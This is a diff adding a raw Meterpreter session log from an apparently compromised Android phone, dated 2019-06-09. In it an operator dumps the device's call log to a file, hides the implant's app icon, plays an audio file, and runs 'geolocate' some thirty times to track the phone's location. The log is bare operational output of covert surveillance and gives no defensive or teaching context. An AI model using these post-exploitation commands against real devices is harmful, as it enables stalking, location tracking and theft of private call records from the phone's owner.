@@ -1,0 +1,32 @@
+ 2019-06-09 13:59:28 +0000
+meterpreter > dump_calllog -o /root/django/users/admin/dumpcalllog.txt
+meterpreter > hide_app_icon
+meterpreter > geolocate
+[*] Playing /root/a.mp3...
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Playing ....
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
